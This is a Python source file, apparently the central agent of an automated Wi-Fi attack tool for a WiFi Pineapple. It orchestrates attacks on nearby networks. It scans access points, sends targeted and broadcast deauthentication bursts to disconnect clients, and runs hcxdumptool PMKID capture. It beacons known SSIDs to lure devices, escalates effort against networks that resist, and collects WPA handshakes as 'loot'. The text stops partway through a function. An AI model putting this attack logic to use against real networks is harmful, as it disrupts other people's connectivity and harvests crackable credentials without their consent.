import json
import logging
import os
import threading
import time

from . import captures, config, history as history_mod, interfaces
from . import pineap as pineap_mod
from . import pmkid as pmkid_mod, pool as pool_mod, scope as scope_mod
from . import conditions, epoch as epoch_mod
from . import targeting as targeting_mod
from . import stats as stats_mod, system, voice
from .captures import APLog

MAX_NAME = 24
MIN_ACTIVITY = 0.5
STATS_COMPLAIN_EVERY = 60
BACKLOG_BUDGET = 45
BACKLOG_EVERY = 120
STATS_JOIN_TIMEOUT = 10.0
SETTLE_SLACK = 60
CAPTURE_PATH_EVERY = 60
POOL_REFRESH_SECS = 120
OUTCOME_DELAY = captures.MIN_CONVERT_AGE + BACKLOG_EVERY + SETTLE_SLACK
PINEAPD_SETTLE = 6
MAX_RECLAIM_TRIES = 3
OUR_CAPTURES = ('hcxdump_', 'pmkid_', 'sweep_')

NORMAL = 'normal'
LOW = 'low'
CRITICAL = 'critical'


UNHEARD = -100
AIMABLE = ('clients', 'kin')








class Agent:
    def __init__(self, settings, screen, plan, feedback=None):
        self.settings = settings
        self.screen = screen
        self.plan = plan
        self.feedback = feedback
        self.handshakes_dir = config.ensure_loot_dir(settings.handshakes_dir)
        config.adopt_legacy_loot(self.handshakes_dir)
        os.makedirs(config.DATA_DIR, exist_ok=True)

        self.pineap = pineap_mod.PineAP(plan.capture, settings.tune('ap_ttl'),
                                        keep=plan.keep_enabled)
        foreign = config.foreign_loot_dirs(self.handshakes_dir)
        self.foreign_dirs = foreign
        if foreign:
            logging.info('also reading captures pineapd stored in %s',
                         ', '.join(foreign))
        self.captures = captures.CaptureIndex(self.handshakes_dir,
                                              config.CAPTURE_CACHE,
                                              extra=foreign)
        self.epoch = epoch_mod.Epoch(settings)
        self.mobility = conditions.Mobility()
        self.env = conditions.Environment(settings)
        self.mood = epoch_mod.Mood(self.epoch, settings, screen)
        self.scope = scope_mod.Scope(
            self.captures,
            whitelist=settings.get('whitelist'),
            blacklist=settings.get('blacklist'),
            skip_captured=settings.get('skip_captured'),
            cover_siblings=settings.get('cover_siblings'),
            max_interactions=settings.tune('max_interactions'))
        self.pmkid = pmkid_mod.PmkidHunter(self.handshakes_dir, config.DATA_DIR,
                                           plan, settings)
        self.aplog = APLog(settings)
        self.stats = stats_mod.Yield(config.YIELD_FILE)
        self.pool = pool_mod.SsidPool(settings, on_reload=self._radios_reloaded)

        self.stopping = threading.Event()
        self.indexed = threading.Event()
        self._wake = threading.Event()
        self._paused = threading.Event()
        self.exit_requested = False
        self.return_to_menu = False

        self.access_points = []
        self.seen_points = []
        self.session_handshakes = 0
        self.last_pwnd = None
        self.started_at = time.time()
        self._began = time.monotonic()
        self._paused_for = 0.0
        self._pmkid_scope = None
        self._pmkid_channels = None
        self._scope_dirty = False
        self._scope_settings = (settings.get('whitelist'),
                                settings.get('blacklist'),
                                settings.get('skip_captured'),
                                settings.get('cover_siblings'))
        self._pool_setting = settings.get('pool_enabled')
        self.idle_reason = None
        self._credit = threading.Lock()
        self._radios = threading.RLock()
        self._releasing = threading.Event()
        self._restarts = pineap_mod.RestartBudget()
        self._reclaim_due = 0.0
        self._reclaim_tries = 0
        self._release_pending = threading.Event()
        self._release_gate = threading.Lock()
        self.targeting = targeting_mod.Targeting(self)
        self.history = history_mod.History(
            settings, interfaces.regdomain(),
            lambda mac: self.pmkid.guarded(mac))
        self.space = NORMAL
        self._handshakes_off = False
        self._capture_path_checked = 0.0
        self._pmkid_running = True
        self._warned_space = False
        self._pinned = (None, 0.0)
        self._retuned_at = 0.0
        self._radios_checked = 0.0
        self._deaf_kicked = frozenset()
        self._stats_failures = 0
        self._first_index_done = False
        self._recon_saved = 0.0
        self._total_deauths = 0
        self._total_assocs = 0
        self._stats_thread = None
        self._backlog_thread = None
        self._pool_dirty = False
        self._pool_checked = 0.0
        self._stopped = False
        self._lingered = None
        self._session_networks = set()
        screen.bind(self)
        settings.on_change(self.apply_settings)

    def _radios_reloaded(self):
        self._reclaim_radios('the radios were reloaded', kick=False)

    def _reclaim_radios(self, why, kick=True):
        if self.stopping.is_set():
            return True
        if self.pmkid.sweeping():
            logging.debug('%s - waiting for the sweep to give the radio back',
                          why)
            return False
        logging.warning('%s - re-claiming the radios', why)
        with self._radios:
            interfaces.forget_monitor_cache()
            claimed = self.pineap.claim_capture_radio()
            if self.pmkid.iface and self.plan.dedicated_pmkid:
                if not (kick and self.pmkid.restart(
                        'another process had taken its radio')):
                    self._sync_pmkid_scope_locked(force=True)
            return claimed

    def apply_settings(self, settings=None):
        s = self.settings
        current = (s.get('whitelist'), s.get('blacklist'),
                   s.get('skip_captured'), s.get('cover_siblings'))
        self.scope.update(whitelist=current[0], blacklist=current[1],
                          skip_captured=current[2], cover_siblings=current[3])
        self.aplog.reload()
        if current != self._scope_settings:
            self._scope_settings = current
            self._scope_dirty = True
            self._pool_dirty = True
        pool_now = s.get('pool_enabled')
        if pool_now != self._pool_setting:
            self._pool_setting = pool_now
            self._pool_dirty = True

    def _cue(self, name, *args):
        if self.feedback is not None:
            getattr(self.feedback, name)(*args)

    def report_trouble(self):
        self._cue('on_error')

    def should_stop(self):
        return self.exit_requested or self.return_to_menu

    def interrupted(self):
        return self.should_stop() or self._paused.is_set()

    def request_exit(self):
        self.exit_requested = True
        self._wake.set()

    def request_menu(self):
        self.return_to_menu = True
        self._wake.set()

    def pause(self):
        if self._paused.is_set():
            return
        self._paused.set()
        self._wake.set()
        logging.info('paused, holding the radios still')
        self._release_pending.set()
        self._release_soon()

    def _release_soon(self):
        with self._release_gate:
            if self._releasing.is_set():
                return
            self._releasing.set()
            threading.Thread(target=self._release_channel_lock,
                             name='pause-release', daemon=True).start()

    def _release_channel_lock(self):
        try:
            while self._release_pending.is_set():
                self._release_pending.clear()
                try:
                    if self._paused.is_set():
                        self.pineap.cancel_examine()
                    if self._paused.is_set():
                        self.pmkid.hush()
                    if not self._paused.is_set():
                        self.pmkid.unhush()
                except Exception as e:
                    logging.debug('could not release the channel lock: %s', e)
        finally:
            with self._release_gate:
                self._releasing.clear()
            if self._release_pending.is_set():
                self._release_soon()

    def resume(self):
        if not self._paused.is_set():
            return
        self._paused.clear()
        logging.info('resumed')
        self._wake.set()
        try:
            self.pmkid.unhush()
        except Exception as e:
            logging.debug('could not restart the PMKID capture: %s', e)

    @property
    def paused(self):
        return self._paused.is_set()

    def wait_while_paused(self):
        if not self._paused.is_set():
            return not self.should_stop()
        held = time.monotonic()
        while self._paused.is_set() and not self.should_stop():
            self.stopping.wait(0.2)
        idle = time.monotonic() - held
        self._paused_for += idle
        self.stats.idled(idle)
        return not self.should_stop()

    def mark(self):
        return (time.monotonic(), self._paused_for)

    def since(self, mark):
        spent = time.monotonic() - mark[0]
        return max(0.0, spent - (self._paused_for - mark[1]))

    def sleep(self, seconds):
        deadline = time.monotonic() + seconds
        while True:
            if self._paused.is_set():
                if not self.wait_while_paused():
                    return False
                deadline = time.monotonic() + seconds
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                return True
            if self.should_stop():
                return False
            self._wake.wait(remaining)
            self._wake.clear()

    def start(self):
        self.screen.on_starting()
        if self.plan.warning:
            logging.warning(self.plan.warning)
            self.screen.set_status(self.plan.warning)
            self.sleep(4)
        else:
            self.sleep(2)

        logging.info('loot: %s', self.handshakes_dir)
        self.check_capture_path(force=True)
        deauth, pmkid = self.targeting.hunting_with()
        if deauth and self._handshakes_off:
            logging.error('deauth is on but pineapd will not save what it '
                          'shakes loose - check loghandshake in uci')
        if not deauth and not pmkid:
            logging.warning('deauth and PMKID are both off - '
                            'this run can only watch, not capture')
        elif not deauth:
            logging.warning('deauth is off - relying on PMKID alone')
        elif not pmkid:
            logging.warning('PMKID is off - relying on deauth alone')
        self.screen.set_status('reading captures...')
        threading.Thread(target=self._index_loot, name='index',
                         daemon=True).start()

        try:
            pmkid_mod.recover_previous(config.DATA_DIR)
        except Exception as e:
            logging.debug('recovering from an earlier run: %s', e)

        try:
            config.sweep_scratch()
        except Exception as e:
            logging.debug('clearing scratch files: %s', e)

        try:
            self.pool.cleanup_stale()
        except Exception as e:
            logging.debug('stale SSID pool check: %s', e)

        self.pineap.start()
        self._sync_pmkid_scope(force=True)
        self.pmkid.start()
        self.aplog.start()

        self._stats_thread = threading.Thread(target=self._stats_loop,
                                              name='stats', daemon=True)
        self._stats_thread.start()
        self.screen.on_normal()

    def stop(self):
        if self._stopped:
            return
        self._stopped = True
        logging.info('stopping agent')
        self.stopping.set()
        try:
            self.captures.cancel()
        except Exception as e:
            logging.debug('cancelling the capture index: %s', e)
        thread = self._stats_thread
        if thread is not None and thread.is_alive():
            thread.join(timeout=STATS_JOIN_TIMEOUT)
            if thread.is_alive():
                logging.warning('the stats thread did not stop in time')
        for what, step in (
                ('settings listener',
                 lambda: self.settings.off_change(self.apply_settings)),
                ('session', self._save_session),
                ('learned history', self.history.save),
                ('yield history', lambda: self.stats.save(force=True)),
                ('capture cache', self.captures.flush),
                ('AP log', self.aplog.stop),
                ('PMKID', lambda: self.pmkid.stop(self.pineap)),
                ('SSID pool', self.pool.stop),
                ('radio', self.pineap.stop),
                ('borrowed interfaces', interfaces.restore_released)):
            try:
                step()
            except BaseException as e:
                logging.warning('shutdown: %s did not stop cleanly: %s', what, e)
        self._cue('shutdown')

    def _index_loot(self):
        began = time.monotonic()
        try:
            self._convert_backlog(budget=BACKLOG_BUDGET)
            first = []
            try:
                first = self.captures.refresh()
            except Exception as e:
                logging.warning('could not index captures: %s', e)
            finally:
                self.indexed.set()
            if first:
                try:
                    self._on_new_captures(first, self.captures.networks())
                except Exception as e:
                    logging.debug('crediting the first index pass: %s', e)
            self._first_index_done = True
            took = time.monotonic() - began
            if took > 2:
                logging.info('indexed captures in %.1fs', took)
            weak = self.captures.weak_networks()
            logging.info('already captured in previous runs: %d networks (%d BSSIDs)',
                         self.captures.network_count(), len(self.captures.bssids))
            if weak:
                logging.info('%d of them only have an M1M2 pair, still worth hunting: %s',
                             len(weak), ', '.join(sorted(weak)[:6]))
        except Exception as e:
            logging.warning('indexing captures failed: %s', e)
        finally:
            self.indexed.set()

    def wait_for_loot(self, seconds=120):
        if self.indexed.is_set():
            return True
        deadline = time.monotonic() + seconds
        while time.monotonic() < deadline and not self.should_stop():
            if self._paused.is_set():
                deadline += 0.2
            if self.indexed.wait(0.2):
                return True
        return self.indexed.is_set()

    def _convert_backlog(self, budget=None):
        try:
            done = captures.convert_pcaps(self.handshakes_dir, budget=budget,
                                          extra=self.foreign_dirs)
            if done:
                logging.info('converted %d pending capture(s)', done)
        except Exception as e:
            logging.debug('conversion backlog: %s', e)

    def _schedule_backlog(self):
        if self.stopping.is_set():
            return
        thread = self._backlog_thread
        if thread is not None and thread.is_alive():
            return
        thread = threading.Thread(target=self._convert_backlog, name='convert',
                                  kwargs={'budget': BACKLOG_BUDGET}, daemon=True)
        self._backlog_thread = thread
        thread.start()

    def _stats_loop(self):
        next_backlog = time.monotonic() + BACKLOG_EVERY
        while not self.stopping.is_set():
            try:
                self.settings.reload_if_changed()
                if self.indexed.is_set():
                    before = self.captures.networks()
                    before_strong = self.captures.strong_networks()
                    new = self.captures.refresh()
                    gained = self.captures.networks() - before
                    gained |= self.captures.strong_networks() - before_strong
                    if new:
                        self._on_new_captures(new, gained)
                self.check_domain()
                self.check_space()
                self.check_capture_path()
                self.check_pineapd()
                if self.stopping.is_set():
                    break
                force, self._scope_dirty = self._scope_dirty, False
                self._sync_pmkid_scope(force=force)
                self.screen.update_stats(self)
                self.stats.save()
                if time.monotonic() >= next_backlog:
                    next_backlog = time.monotonic() + BACKLOG_EVERY
                    self._schedule_backlog()
                self._stats_failures = 0
            except Exception as e:
                self._stats_failures += 1
                if (self._stats_failures <= 3
                        or self._stats_failures % STATS_COMPLAIN_EVERY == 0):
                    logging.warning('housekeeping failed (%d in a row): %s',
                                    self._stats_failures, e)
            self.stopping.wait(5)

    def _captured_this_run(self, rec):
        if self._first_index_done:
            return True
        path = rec.get('file') or ''
        base = path.rsplit('.', 1)[0]
        name = os.path.basename(base)
        candidates = [base + '.pcapng', base + '.pcap']
        if name.startswith(captures.FOREIGN_PREFIX):
            stem = name[len(captures.FOREIGN_PREFIX):]
            for folder in self.foreign_dirs:
                candidates.append(os.path.join(folder, stem + '.pcapng'))
                candidates.append(os.path.join(folder, stem + '.pcap'))
        foreign = name.startswith(captures.FOREIGN_PREFIX)
        if not foreign:
            candidates.append(path)
        for candidate in candidates:
            try:
                return os.path.getmtime(candidate) >= self.started_at - 60
            except OSError:
                continue
        return not foreign

    def _on_new_captures(self, records, gained):
        with self._credit:
            self._credit_captures(records, gained)

    def _credit_captures(self, records, gained):
        for rec in records:
            self.pineap.learn_essid(rec['ap'], rec['essid'])
        fresh = [r for r in records if self._captured_this_run(r)]
        old = len(records) - len(fresh)
        if old:
            logging.info('indexed %d capture(s) made before this run', old)
        if not fresh:
            return
        gained = set(gained) & {(r['essid'] or r['ap'].lower()) for r in fresh}
        where = {ap.get('mac', '').lower(): ap.get('channel')
                 for ap in self.access_points}
        bands = {ap.get('mac', '').lower(): ap.get('band')
                 for ap in self.access_points}
        for rec in fresh:
            self.history.rest(rec['ap'].lower())
        credited = set()
        for rec in fresh:
            mac = rec['ap'].lower()
            network = rec['essid'] or mac
            if not gained or network not in gained or network in credited:
                continue
            credited.add(network)
            if not self._from_pineapd(rec):
                kind = stats_mod.PMKID
            elif self.history.recently_attacked(mac, OUTCOME_DELAY):
                kind = stats_mod.DEAUTH
            else:
                kind = stats_mod.PINEAP
            self.stats.captured(where.get(mac), kind, band=bands.get(mac))
        if not gained:
            logging.info('extra handshake for a network already captured (%d records)',
                         len(fresh))
            return
        named = next((r for r in fresh if (r['essid'] or r['ap'].lower()) in gained),
                     fresh[0])
        self.last_pwnd = named['essid'] or named['ap']
        counted = gained - self._session_networks
        self._session_networks |= gained
        self.session_handshakes += len(counted)
        self.epoch.track(handshake=True, inc=len(gained))
        logging.warning('captured %s (%s) - %d network(s), %d new this run',
                        self.last_pwnd, named['ap'], len(gained), len(counted))
        self._cue('on_capture', len(gained))
        self.screen.on_handshakes(len(gained), self.last_pwnd)

    def _from_pineapd(self, rec):
        name = os.path.basename(rec.get('file') or '')
        return bool(name) and not name.startswith(OUR_CAPTURES)

    def pwnd_counts(self):
        return self.session_handshakes, self.captures.network_count()

    def last_capture(self):
        if not self.last_pwnd or self.session_handshakes <= 0:
            return ''
        name = self.last_pwnd
        if len(name) > MAX_NAME:
            name = name[:MAX_NAME - 1] + '~'
        return name

    def _sync_pmkid_scope(self, force=False):
        with self._radios:
            self._sync_pmkid_scope_locked(force)

    def sync_pmkid_tuning(self):
        hunter = self.pmkid
        lure = ()
        if not self.pool.running:
            lure = tuple(pool_mod.wanted_ssids(self.pineap.stations(),
                                               self.seen_points, self.scope))
        if set(lure) != set(hunter.essids):
            if lure:
                logging.info('PineAP is not advertising, so hcxdumptool will '
                             'beacon %d known SSIDs itself', len(lure))
            hunter.essids = lure
        patience = self.targeting.pmkid_patience()
        if patience != hunter.patience:
            logging.info('targets are %s, giving hcxdumptool %sx the attempts',
                         self.env.reach, patience)
            hunter.patience = patience

    def _sync_pmkid_scope_locked(self, force=False):
        hunter = self.pmkid
        self.sync_pmkid_tuning()
        if not hunter.iface:
            return
        targets = self.scope.pmkid_targets(self.access_points)
        channels = self.targeting.tunable(self.targeting.hot_channels(), hunter.iface)
        if self.settings.channels and not channels:
            targets = set()
        tuned = tuple(sorted(set(channels or ())))
        now = time.monotonic()
        stale = now - self._retuned_at >= self.mobility.profile['retune_after']
        if (not force and not stale and targets == self._pmkid_scope
                and tuned == self._pmkid_channels):
            return
        urgent = False
        if self._pmkid_scope and targets is not None:
            dropped = self._pmkid_scope - targets
            if dropped:
                visible = {ap.get('mac', '').lower()
                           for ap in self.access_points}
                urgent = bool(dropped & visible)
        self._pmkid_scope = targets
        self._pmkid_channels = tuned
        self._retuned_at = now
        hunter.retune(self.targeting.pmkid_order(targets), channels, urgent=urgent)




    def check_radios(self):
        now = time.monotonic()
        if now - self._radios_checked < self.settings.tune('radio_recheck_secs'):
            return
        self._radios_checked = now
        try:
            if self.pmkid.revive():
                self._sync_pmkid_scope(force=True)
        except Exception as e:
            logging.debug('PMKID revive: %s', e)
        plan = interfaces.resolve(self.settings.get('iface_choice'),
                                  refresh=True,
                                  avoid=pool_mod.reserved_phys(self.settings))
        if (plan.capture == self.plan.capture and plan.pmkid == self.plan.pmkid
                and plan.recons == self.plan.recons):
            return
        logging.warning('radio layout changed: %s -> %s',
                        self.plan.describe(), plan.describe())
        self.adopt_plan(plan)

    def adopt_plan(self, plan):
        with self._radios:
            self._adopt_plan_locked(plan)

    def _adopt_plan_locked(self, plan):
        old, self.plan = self.plan, plan
        pmkid_moved = plan.pmkid != old.pmkid
        if pmkid_moved:
            try:
                self.pmkid.stop(self.pineap)
            except Exception as e:
                logging.debug('stopping old PMKID: %s', e)

        self.pineap.keep = plan.keep_enabled
        self.pineap.capture_iface = plan.capture
        interfaces.forget_monitor_cache()
        self.pineap.claim_capture_radio()

        if pmkid_moved:
            learned = dict(self.pmkid.security)
            self.pmkid = pmkid_mod.PmkidHunter(self.handshakes_dir, config.DATA_DIR,
                                               plan, self.settings)
            self.pmkid.security = learned
            self._pmkid_scope = None
            self._pmkid_channels = None
            self._retuned_at = 0.0
            if not self.pmkid_allowed():
                logging.warning('not starting PMKID on the new radio '
                                '(disk %s)', self.space)
            elif plan.dedicated_pmkid:
                self.pmkid.start()
                self._pmkid_running = True
                self._sync_pmkid_scope_locked(force=True)
                logging.info('second radio online: %s', self.pmkid.describe())
            else:
                self.pmkid.start()
                self._pmkid_running = True
                logging.info('second radio gone, falling back to sweeps')
        self.screen.set('hint', self.status_line())




    def refresh_targets(self):
        if not self.wait_for_loot():
            logging.warning('still reading captures, skipping this epoch '
                            'rather than re-attacking what is already captured')
            self.seen_points = []
            self.access_points = []
            return []
        self.pineap.sync()
        seen = self.pineap.access_points()
        was = self.mobility.state
        self.mobility.observe(seen)
        if self.mobility.state != was:
            logging.info('mobility: %s', self.mobility.detail())
        profile = self.mobility.profile
        self.pineap.ap_ttl = profile['ap_ttl']
        self.pineap.ap_poll = profile['ap_poll']
        self.pineap.client_poll = profile['client_poll']
        self.epoch.observe(seen)
        self.aplog.log(seen)
        self.scope.observe(seen)
        self.seen_points = seen
        aps = [ap for ap in seen if self.scope.in_scope(ap)]
        aps.sort(key=self.targeting.priority, reverse=True)
        self.access_points = aps
        was = self.env.describe()
        self.env.observe([ap for ap in aps if self.scope.targetable(ap)],
                         self.pineap.stations(), self.pineap.traffic())
        self.env.sample_radios(self.plan.keep_enabled + [self.pmkid.iface])
        self.check_deaf_radio()
        if self.env.describe() != was:
            logging.info('environment: %s', self.env.detail())
        return aps

    def check_deaf_radio(self):
        deaf = set(self.env.deaf_radios or ())
        if not deaf:
            self._deaf_kicked = frozenset()
            return
        iface = self.pmkid.iface
        if not iface or iface not in deaf or iface in self._deaf_kicked:
            return
        try:
            if self.pmkid.restart('it has heard nothing for several epochs'):
                self._deaf_kicked = self._deaf_kicked | {iface}
                self._sync_pmkid_scope(force=True)
        except Exception as e:
            logging.debug('could not restart the PMKID capture: %s', e)


    def check_domain(self):
        here = interfaces.regdomain()
        if not here or here == self.history.domain:
            return self.history.domain
        logging.warning('regulatory domain changed from %s to %s, '
                        'forgetting what refused injection there',
                        self.history.domain or 'unknown', here)
        interfaces.forget_monitor_cache()
        self.history.rebase_domain(here)
        return here

    def pmkid_allowed(self):
        return self.space != CRITICAL

    def check_capture_path(self, force=False):
        now = time.monotonic()
        if not force and now - self._capture_path_checked < CAPTURE_PATH_EVERY:
            return
        self._capture_path_checked = now
        logging_on = pineap_mod.handshake_logging()
        if logging_on is None:
            return
        off = not logging_on
        if off == self._handshakes_off:
            return
        self._handshakes_off = off
        if off:
            logging.error('pineapd is running with --handshakes=false, so no '
                          'deauth will ever produce a saved handshake')
        else:
            logging.warning('pineapd is saving handshakes again')

    def sync_pmkid_power(self):
        with self._radios:
            want = self.pmkid_allowed()
            if want == self._pmkid_running:
                return
            self._pmkid_running = want
            if want:
                logging.warning('resources are back, PMKID is hunting again')
                try:
                    self.pmkid.start()
                    self._sync_pmkid_scope_locked(force=True)
                except Exception as e:
                    logging.debug('restarting PMKID: %s', e)
                return
            logging.warning('standing PMKID down (disk %s)', self.space)
            try:
                self.pmkid.stop(self.pineap)
            except Exception as e:
                logging.debug('stopping PMKID: %s', e)

    def check_pineapd(self):
        pineap_mod.reap_children()
        if self._reclaim_due and time.monotonic() >= self._reclaim_due:
            if self.pmkid.sweeping():
                self._reclaim_due = time.monotonic() + PINEAPD_SETTLE
                return
            self._reclaim_tries += 1
            done = (pineap_mod.pineapd_alive()
                    and self._reclaim_radios('pineapd was restarted'))
            if done or self._reclaim_tries >= MAX_RECLAIM_TRIES:
                if not done:
                    logging.warning('could not re-claim the radios after '
                                    'restarting pineapd')
                self._reclaim_due = 0.0
                self._reclaim_tries = 0
            else:
                self._reclaim_due = time.monotonic() + PINEAPD_SETTLE
        if self.pineap.responding:
            self._restarts.reset()
            return
        if not self._restarts.may_restart() or pineap_mod.pineapd_alive():
            return
        self._restarts.defer()
        if pineap_mod.relaunch_pineapd():
            self._restarts.spend()
            self._reclaim_due = time.monotonic() + PINEAPD_SETTLE
            self._reclaim_tries = 0

    def check_space(self):
        free = system.disk_free_mb(self.handshakes_dir)
        if free is None:
            return NORMAL
        if free <= self.settings.tune('critical_disk_mb'):
            state = CRITICAL
        elif free <= self.settings.tune('low_disk_mb'):
            state = LOW
        else:
            state = NORMAL
        if state != self.space:
            self.space = state
            if state == CRITICAL:
                logging.critical('only %.0f MB left for captures', free)
            elif state == LOW:
                logging.warning('only %.0f MB left for captures', free)
            self.sync_pmkid_power()
        return state

    def note_refusal(self, ap):
        count = self.history.note_refusal(ap)
        if count == self.settings.tune('max_deauth_refusals'):
            logging.warning('cannot inject on %s (channel %s), leaving it to PMKID',
                            ap.get('hostname') or ap.get('mac', '').lower(),
                            ap.get('channel', 0))

    def note_approach(self, mac, hit):
        if self.history.note_approach(mac, hit):
            logging.warning('%s has ignored every deauth with clients present, '
                            'leaving it to PMKID from now on%s', mac,
                            ' (it offers WPA3, so its clients are protected)'
                            if self.pmkid.guarded(mac) else '')

















    def status_line(self):
        deauth, pmkid = self.targeting.hunting_with()
        described = self.plan.describe()
        if not pmkid:
            described = described.replace('PMKID sweep', 'PMKID off')
        urgent = []
        if not self.pineap.responding:
            urgent.append('radio not answering')
        if self.space != NORMAL:
            urgent.append('disk low')
        if self._handshakes_off:
            urgent.append('pineapd not saving handshakes')
        if not deauth and not pmkid:
            urgent.append('nothing enabled')
        elif not deauth:
            urgent.append('deauth off')
        rest = [described]
        clients = self.pineap.client_count()
        if clients:
            rest.append('%d clients' % clients)
        if self.pool.running:
            rest.append('posing as %d' % len(self.pool.ssids))
        elif self.settings.get('pool_enabled') and self.pool.blocked:
            rest.append('no radio for the SSID pool')
        label = self.mobility.describe()
        if label:
            rest.append(label)
        air = self.env.describe()
        if air:
            rest.append(air)
        if self.env.deaf_radios:
            urgent.append('%s hearing nothing' % ', '.join(self.env.deaf_radios))
        if self.history.domain:
            rest.append(self.history.domain)
        return ' - '.join(urgent + rest)

    def recon(self):
        seconds = self.settings.tune('recon_time')
        if self.epoch.inactive_for >= self.settings.tune('max_inactive_scale'):
            seconds *= self.settings.tune('recon_inactive_multiplier')
        seconds = max(6, int(self.mobility.scale('recon_scale', seconds)))
        self.screen.set_channel(None)
        self.pineap.cancel_examine()
        self._cue('on_hunt')
        self.epoch.track(sleep=True, inc=self.listen(seconds))

    def listen(self, seconds):
        floor = min(seconds, self.settings.tune('min_recon_time'))
        settle = self.settings.tune('recon_settle')
        began = self.mark()
        known = self.pineap.ap_macs()
        seen_clients = self.pineap.client_count()
        last_new = 0.0
        while True:
            spent = self.since(began)
            left = seconds - spent
            if left <= 0 or self.should_stop():
                break
            self.screen.wait(min(2.0, left), sleeping=False, countdown=left,
                             settle=False)
            now = self.since(began)
            seen = self.pineap.ap_macs()
            fresh = seen - known
            heard = self.pineap.client_count()
            if fresh or heard > seen_clients:
                known |= fresh
                seen_clients = max(seen_clients, heard)
                last_new = now
            elif known and now >= floor and now - last_new >= settle:
                early = max(0.0, seconds - now)
                self._recon_saved += early
                logging.debug('recon settled at %d APs, %.0fs early',
                              len(known), early)
                break
        self.screen.on_normal()
        return int(self.since(began))

    def hop(self, channel, band=None):
        if self.epoch.stale:
            return
        wait = 0
        if self.epoch.did_deauth:
            wait = self.settings.tune('hop_recon_time')
        elif self.epoch.did_associate:
            wait = self.settings.tune('min_recon_time')
        if (channel, band) != (self.pineap.current_channel,
                               self.pineap.current_band):
            leaving = self.pineap.current_channel
            leaving_band = self.pineap.current_band
            if self._lingered == (leaving, leaving_band):
                wait = 0
            self._lingered = None
            if leaving and wait:
                began = self.mark()
                locked = self.pineap.examine_channel(leaving, wait, leaving_band)
                self._pinned = (((leaving, leaving_band),
                                 time.monotonic() + wait) if locked
                                else (None, 0.0))
                self.screen.wait(wait)
                self.epoch.track(sleep=True, inc=wait)
                if locked:
                    self.stats.spent(leaving, self.since(began), leaving_band)
            self.pineap.current_channel = channel
            self.pineap.current_band = band or pineap_mod.band_for_channel(channel)
            self.epoch.track(hop=True)
            self.screen.set_channel(channel, band)

    def hold(self, channel, seconds, band=None):
        if not channel or seconds <= 0:
            return False
        if not self.pineap.examine_channel(channel, seconds, band):
            logging.debug('could not hold ch %s, letting recon keep hopping',
                          channel)
            self._pinned = (None, 0.0)
            return False
        self._pinned = ((channel, band), time.monotonic() + seconds)
        return True

    def dwell(self, channel, seconds, band=None):
        if not channel or seconds <= 0:
            return False
        needed = time.monotonic() + seconds
        pinned_key, pinned_until = self._pinned
        locked = (pinned_key == (channel, band) and pinned_until >= needed
                  and self.pineap.current_channel == channel)
        if not locked:
            locked = self.pineap.examine_channel(channel, seconds, band)
            self._pinned = ((channel, band), needed) if locked else (None, 0.0)
        began = self.mark()
        self.sleep(seconds)
        if locked:
            self.stats.spent(channel, self.since(began), band)
            self._lingered = (channel, band)
        return locked

    def engage(self, ap, push=0):
        if self.epoch.stale or not self.scope.targetable(ap):
            return False
        if not self.wait_while_paused():
            return False
        self._cue('on_attack')
        self.screen.on_assoc(ap)
        ok = False
        try:
            wanted = max(self.settings.tune('examine_seconds') + max(0, push),
                         int(self.targeting.attack_seconds(ap, push)) + 2)
            ok = self.pineap.examine_bssid(ap['mac'], wanted)
        except Exception as e:
            self.mood.on_error(ap['mac'], e)
        self._pinned = (None, 0.0)
        if ok:
            self.epoch.track(assoc=True)
        else:
            self.mood.on_miss(ap.get('hostname') or ap['mac'])
        throttle = self.settings.tune('throttle_assoc')
        if throttle > 0:
            self.sleep(throttle)
        self.screen.on_normal()
        return ok

    def deauth(self, ap, station=pineap_mod.BROADCAST, push=0, credible=False):
        if self.epoch.stale or not self.settings.get('deauth_enabled'):
            return False
        targeted = station != pineap_mod.BROADCAST
        who = station if targeted else None
        if not self.scope.may_attack(ap, who):
            return False
        if not self.wait_while_paused():
            return False
        name = ap.get('hostname') or ap.get('mac')
        self._cue('on_attack')
        self.screen.on_deauth(station if targeted else name, targeted)
        outcome = pineap_mod.FAILED
        try:
            logging.info('deauth %s (%s) ch %s -> %s', ap.get('hostname', ''),
                         ap['mac'], ap.get('channel'),
                         station if targeted else 'broadcast')
            self.scope.record_attack(ap, who)
            outcome = self.pineap.deauth(ap['mac'], station, ap.get('channel'),
                                         bursts=self.targeting.burst_count(
                                             not self.targeting.hearable(ap),
                                             self.env.noise(ap.get('channel'),
                                                            ap.get('band'))),
                                         gap=self.settings.tune('deauth_burst_gap'),
                                         should_stop=self.interrupted)
        except Exception as e:
            self.mood.on_error(ap['mac'], e)
        sent = outcome == pineap_mod.SENT
        mac = ap.get('mac', '').lower()
        if sent:
            self.epoch.track(deauth=True)
            held = mac in self.captures.bssids
            self.history.record_attack(mac, held, targeted and credible)
            self.history.forget_refusal(mac)
        elif outcome == pineap_mod.REFUSED:
            self.note_refusal(ap)
        else:
            logging.debug('deauth of %s did not go out, not blaming the AP', mac)
        throttle = self.settings.tune('throttle_deauth')
        if throttle > 0:
            self.sleep(throttle)
        self.screen.on_normal()
        return sent

    def attack(self, ap):
        if not self.targeting.deauth_worth_it(ap):
            logging.debug('%s is stubborn, leaving it to PMKID', ap.get('mac'))
            return False
        push = self.targeting.effort(ap)
        if push:
            logging.info('%s has resisted before, trying harder (level %d)',
                         ap.get('hostname') or ap.get('mac'), push)
        if not self.wait_while_paused():
            return False
        if not self.engage(ap, push):
            return False
        self.stats.attempt(ap.get('channel'), ap.get('band'))
        stations, source = self.targeting.attack_stations(ap)
        credible = source in AIMABLE
        limit = self.targeting.aim_limit(source, push)
        if source == 'kin':
            logging.debug('%s names no clients, borrowing %d from its '
                          'other bands', ap.get('mac'), len(stations))
        elif source == 'nearby':
            logging.debug('%s names no clients of its own - one speculative '
                          'aim at the loudest of %d station(s) on its channel, '
                          'then a broadcast', ap.get('mac'), len(stations))
        hit = False
        targeted = False
        if stations:
            ordered = sorted(stations, key=pineap_mod.is_randomised)
            for station in ordered[:limit]:
                if self.should_stop():
                    break
                if self.deauth(ap, station, push, credible=credible):
                    targeted = True
                    hit = True
        if (not targeted or not credible) and not self.should_stop():
            hit = self.deauth(ap, push=push) or hit
        return hit








    def run_pool(self):
        if self.should_stop() or not self.wait_while_paused():
            return
        if not self.pool.sync_enabled():
            if self.pool.running:
                logging.info('taking the SSID pool down')
                self.pool.stop()
            return
        every = max(1, self.settings.tune('pool_refresh_epochs'))
        stale, self._pool_dirty = self._pool_dirty, False
        overdue = (time.monotonic() - self._pool_checked >= POOL_REFRESH_SECS)
